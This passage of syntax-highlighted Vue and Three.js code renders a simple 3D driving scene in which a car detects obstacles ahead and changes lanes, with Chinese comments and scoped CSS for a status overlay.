    <span class="hljs-keyword">const</span> rightBorder = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(borderGeometry, lineMaterial)
    rightBorder.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0</span>)
    rightBorder.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(rightBorder)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createCar</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建主车（简化的车辆模型）</span>
    <span class="hljs-keyword">const</span> carGroup = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
    <span class="hljs-comment">// 车身</span>
    <span class="hljs-keyword">const</span> bodyGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)
    <span class="hljs-keyword">const</span> bodyMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x87CEEB</span> }) <span class="hljs-comment">// 浅蓝色主车</span>
    <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(bodyGeometry, bodyMaterial)
    body.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">0.5</span>
    carGroup.<span class="hljs-title function_">add</span>(body)
    
    <span class="hljs-comment">// 车窗</span>
    <span class="hljs-keyword">const</span> windowGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1.8</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">const</span> windowMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xE8E8E8</span>, <span class="hljs-attr">transparent</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">opacity</span>: <span class="hljs-number">0.5</span> })
    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">window</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(windowGeometry, windowMaterial)
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">1.2</span>
    carGroup.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">window</span>)
    
    <span class="hljs-comment">// 车轮</span>
    <span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.3</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">16</span>)
    <span class="hljs-keyword">const</span> wheelMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x222222</span> })
    
    <span class="hljs-keyword">const</span> wheels = [
        { <span class="hljs-attr">x</span>: -<span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: <span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: <span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: -<span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: -<span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: -<span class="hljs-number">1.2</span> }
    ]
    
    wheels.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">pos</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> wheel = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(wheelGeometry, wheelMaterial)
        wheel.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(pos.<span class="hljs-property">x</span>, <span class="hljs-number">0.3</span>, pos.<span class="hljs-property">z</span>)
        wheel.<span class="hljs-property">rotation</span>.<span class="hljs-property">z</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
        carGroup.<span class="hljs-title function_">add</span>(wheel)
    })
    
    car = carGroup
    car.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(-<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">5</span>) <span class="hljs-comment">// 主车位于右侧车道</span>
    scene.<span class="hljs-title function_">add</span>(car)
}

<span class="hljs-comment">// 检测前方障碍物</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">detectFrontObstacle</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> carX = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
    <span class="hljs-keyword">const</span> carZ = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
    <span class="hljs-keyword">const</span> detectionDistance = <span class="hljs-number">15</span> <span class="hljs-comment">// 检测距离</span>
    <span class="hljs-keyword">const</span> laneWidth = <span class="hljs-number">4</span> <span class="hljs-comment">// 车道宽度</span>
    
    <span class="hljs-comment">// 检查前方是否有障碍物</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> obstacle <span class="hljs-keyword">of</span> obstacles) {
        <span class="hljs-keyword">const</span> obstacleX = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
        <span class="hljs-keyword">const</span> obstacleZ = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
        
        <span class="hljs-comment">// 检查是否在同一车道且在前方</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - carX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 同一车道范围</span>
            obstacleZ &gt; carZ &amp;&amp; <span class="hljs-comment">// 在前方</span>
            obstacleZ - carZ &lt; detectionDistance) { <span class="hljs-comment">// 在检测距离内</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// 寻找安全车道</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">findSafeLane</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道位置</span>
    <span class="hljs-keyword">const</span> carZ = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
    <span class="hljs-keyword">const</span> checkDistance = <span class="hljs-number">20</span> <span class="hljs-comment">// 安全检查距离</span>
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; lanes.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-keyword">if</span> (i === currentLane) <span class="hljs-keyword">continue</span> <span class="hljs-comment">// 跳过当前车道</span>
        
        <span class="hljs-keyword">let</span> isSafe = <span class="hljs-literal">true</span>
        <span class="hljs-keyword">const</span> laneX = lanes[i]
        
        <span class="hljs-comment">// 检查这个车道是否安全</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> obstacle <span class="hljs-keyword">of</span> obstacles) {
            <span class="hljs-keyword">const</span> obstacleX = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
            <span class="hljs-keyword">const</span> obstacleZ = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
            
            <span class="hljs-comment">// 检查前后一定距离内是否有障碍物</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - laneX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 在目标车道</span>
                <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleZ - carZ) &lt; checkDistance) { <span class="hljs-comment">// 在安全检查范围内</span>
                isSafe = <span class="hljs-literal">false</span>
                <span class="hljs-keyword">break</span>
            }
        }
        
        <span class="hljs-keyword">if</span> (isSafe) {
            <span class="hljs-keyword">return</span> i <span class="hljs-comment">// 返回安全车道索引</span>
        }
    }
    
    <span class="hljs-keyword">return</span> currentLane <span class="hljs-comment">// 如果没有安全车道，保持当前车道</span>
}

<span class="hljs-comment">// 执行车道变换</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">performLaneChange</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (isChangingLane) {
        <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>]
        <span class="hljs-keyword">const</span> targetX = lanes[targetLane]
        <span class="hljs-keyword">const</span> currentX = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
        
        <span class="hljs-comment">// 平滑移动到目标车道</span>
        <span class="hljs-keyword">const</span> deltaX = targetX - currentX
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) &gt; <span class="hljs-number">0.1</span>) {
            car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sign</span>(deltaX) * laneChangeSpeed
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 变道完成</span>
            car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = targetX
            currentLane = targetLane
            isChangingLane = <span class="hljs-literal">false</span>
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'变道完成'</span>
            isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
            
            <span class="hljs-comment">// 0.5秒后重置状态</span>
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">if</span> (!isChangingLane) {
                    laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
                }
            }, <span class="hljs-number">500</span>)
        }
    }
    
    <span class="hljs-comment">// 更新显示的车道号</span>
    currentLaneDisplay.<span class="hljs-property">value</span> = currentLane + <span class="hljs-number">1</span> <span class="hljs-comment">// 车道号从1开始</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createObstacles</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建随机障碍物（统一灰白色）</span>
    <span class="hljs-keyword">const</span> obstacleTypes = [
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xD3D3D3</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xC0C0C0</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'truck'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xB8B8B8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">6</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'pedestrian'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xA8A8A8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">0.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1.7</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">0.5</span> } }
    ]
    
    <span class="hljs-comment">// 创建初始障碍物（减少数量）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
        <span class="hljs-title function_">createRandomObstacle</span>(obstacleTypes)
    }
    
    obstacleCount.<span class="hljs-property">value</span> = obstacles.<span class="hljs-property">length</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createRandomObstacle</span> = (<span class="hljs-params">types</span>) =&gt; {
    <span class="hljs-keyword">const</span> type = types[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * types.<span class="hljs-property">length</span>)]
    <span class="hljs-keyword">const</span> obstacle = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
    <span class="hljs-comment">// 主体</span>
    <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span>)
    <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: type.<span class="hljs-property">color</span> })
    <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material)
    body.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span> / <span class="hljs-number">2</span>
    obstacle.<span class="hljs-title function_">add</span>(body)
    
    <span class="hljs-comment">// 如果是车辆，添加车轮</span>
    <span class="hljs-keyword">if</span> (type.<span class="hljs-property">type</span> === <span class="hljs-string">'car'</span> || type.<span class="hljs-property">type</span> === <span class="hljs-string">'truck'</span>) {
        <span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.25</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">0.15</span>, <span class="hljs-number">12</span>)
        <span class="hljs-keyword">const</span> wheelMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x222222</span> })
        
        <span class="hljs-keyword">const</span> wheelPositions = [
            { <span class="hljs-attr">x</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> }
        ]
        
        wheelPositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">pos</span> =&gt;</span> {
            <span class="hljs-keyword">const</span> wheel = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(wheelGeometry, wheelMaterial)
            wheel.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(pos.<span class="hljs-property">x</span>, <span class="hljs-number">0.25</span>, pos.<span class="hljs-property">z</span>)
            wheel.<span class="hljs-property">rotation</span>.<span class="hljs-property">z</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
            obstacle.<span class="hljs-title function_">add</span>(wheel)
        })
    }
    
    <span class="hljs-comment">// 随机位置（6车道系统，增加间距）</span>
    <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道的中心位置</span>
    <span class="hljs-keyword">const</span> lane = lanes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * lanes.<span class="hljs-property">length</span>)]
    obstacle.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(lane, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">60</span> + <span class="hljs-number">20</span>) <span class="hljs-comment">// 增加生成距离</span>
    
    <span class="hljs-comment">// 添加移动速度</span>
    obstacle.<span class="hljs-property">userData</span> = {
        <span class="hljs-attr">speed</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.02</span> + <span class="hljs-number">0.01</span>,
        <span class="hljs-attr">type</span>: type.<span class="hljs-property">type</span>
    }
    
    obstacles.<span class="hljs-title function_">push</span>(obstacle)
    scene.<span class="hljs-title function_">add</span>(obstacle)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">setupCamera</span> = (<span class="hljs-params"/>) =&gt; {
    camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span> / rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>)
    <span class="hljs-comment">// 第三人称跟随视角</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">15</span>)
    camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">animate</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">requestAnimationFrame</span>(animate)
    
    <span class="hljs-keyword">const</span> deltaTime = clock.<span class="hljs-title function_">getDelta</span>()
    
    <span class="hljs-comment">// 检测前方障碍物并执行变道</span>
    <span class="hljs-keyword">if</span> (!isChangingLane &amp;&amp; <span class="hljs-title function_">detectFrontObstacle</span>()) {
        <span class="hljs-keyword">const</span> safeLane = <span class="hljs-title function_">findSafeLane</span>()
        <span class="hljs-keyword">if</span> (safeLane !== currentLane) {
            targetLane = safeLane
            isChangingLane = <span class="hljs-literal">true</span>
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'检测到障碍物，正在变道...'</span>
            isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
        } <span class="hljs-keyword">else</span> {
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'前方有障碍物，无安全车道'</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!isChangingLane) {
        laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
        isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-comment">// 执行变道动作</span>
    <span class="hljs-title function_">performLaneChange</span>()
    
    <span class="hljs-comment">// 更新车辆位置（模拟前进）</span>
    roadOffset += carSpeed
    
    <span class="hljs-comment">// 更新道路标线位置</span>
    scene.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">material</span> &amp;&amp; child.<span class="hljs-property">material</span>.<span class="hljs-property">color</span>.<span class="hljs-title function_">getHex</span>() === <span class="hljs-number">0xffffff</span> &amp;&amp; child.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> === <span class="hljs-number">0.01</span>) {
            child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> -= carSpeed
            <span class="hljs-keyword">if</span> (child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> &lt; -<span class="hljs-number">50</span>) {
                child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> += <span class="hljs-number">100</span>
            }
        }
    })
    
    <span class="hljs-comment">// 更新障碍物位置</span>
    obstacles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">obstacle, index</span>) =&gt;</span> {
        obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> -= carSpeed + obstacle.<span class="hljs-property">userData</span>.<span class="hljs-property">speed</span>
        
        <span class="hljs-comment">// 如果障碍物移出视野，重新生成</span>
        <span class="hljs-keyword">if</span> (obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> &lt; -<span class="hljs-number">30</span>) {
            scene.<span class="hljs-title function_">remove</span>(obstacle)
            obstacles.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>)
            
            <span class="hljs-comment">// 创建新的障碍物（统一灰白色）</span>
            <span class="hljs-keyword">const</span> obstacleTypes = [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xD3D3D3</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xC0C0C0</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'truck'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xB8B8B8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">6</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'pedestrian'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xA8A8A8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">0.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1.7</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">0.5</span> } }
            ]
            <span class="hljs-title function_">createRandomObstacle</span>(obstacleTypes)
        }
    })
    
    <span class="hljs-comment">// 更新速度显示</span>
    speed.<span class="hljs-property">value</span> = <span class="hljs-number">60</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() * <span class="hljs-number">0.001</span>) * <span class="hljs-number">10</span> <span class="hljs-comment">// 模拟速度变化</span>
    obstacleCount.<span class="hljs-property">value</span> = obstacles.<span class="hljs-property">length</span>
    
    <span class="hljs-comment">// 摄像机跟随（考虑变道）</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> - <span class="hljs-number">15</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">8</span>
    camera.<span class="hljs-title function_">lookAt</span>(car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>, car.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> + <span class="hljs-number">2</span>, car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> + <span class="hljs-number">5</span>)
    
    renderer.<span class="hljs-title function_">render</span>(scene, camera)
}

<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 清理资源</span>
    obstacles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">obstacle</span> =&gt;</span> {
        scene.<span class="hljs-title function_">remove</span>(obstacle)
    })
    
    <span class="hljs-keyword">if</span> (car) scene.<span class="hljs-title function_">remove</span>(car)
    <span class="hljs-keyword">if</span> (road) scene.<span class="hljs-title function_">remove</span>(road)
    
    <span class="hljs-comment">// 清理几何体和材质</span>
    scene.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">child</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">geometry</span>) {
            child.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">dispose</span>()
        }
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">material</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(child.<span class="hljs-property">material</span>)) {
                child.<span class="hljs-property">material</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">material</span> =&gt;</span> material.<span class="hljs-title function_">dispose</span>())
            } <span class="hljs-keyword">else</span> {
                child.<span class="hljs-property">material</span>.<span class="hljs-title function_">dispose</span>()
            }
        }
    })
    
    renderer.<span class="hljs-title function_">dispose</span>()
    <span class="hljs-keyword">if</span> (rendererCanvas.<span class="hljs-property">value</span> &amp;&amp; renderer.<span class="hljs-property">domElement</span>) {
        rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">removeChild</span>(renderer.<span class="hljs-property">domElement</span>)
    }
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.car-three</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
}

<span class="hljs-selector-class">.controls</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.7</span>);
    <span class="hljs-attribute">color</span>: white;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}

<span class="hljs-selector-class">.speed-info</span>, <span class="hljs-selector-class">.obstacle-count</span> {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span> <span class="hljs-number">0</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">font-weight</span>: bold;
}

<span class="hljs-selector-class">.speed-info</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00ff00</span>;
}

<span class="hljs-selector-class">.obstacle-count</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffaa00</span>;
}

<span class="hljs-selector-class">.lane-info</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00aaff</span>;
}

<span class="hljs-selector-class">.lane-change-status</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffff00</span>;
    <span class="hljs-attribute">font-weight</span>: bold;
}

<span class="hljs-selector-class">.lane-change-status</span><span class="hljs-selector-class">.active</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff6600</span>;
    <span class="hljs-attribute">animation</span>: blink <span class="hljs-number">1s</span> infinite;
}

<span class="hljs-keyword">@keyframes</span> blink {
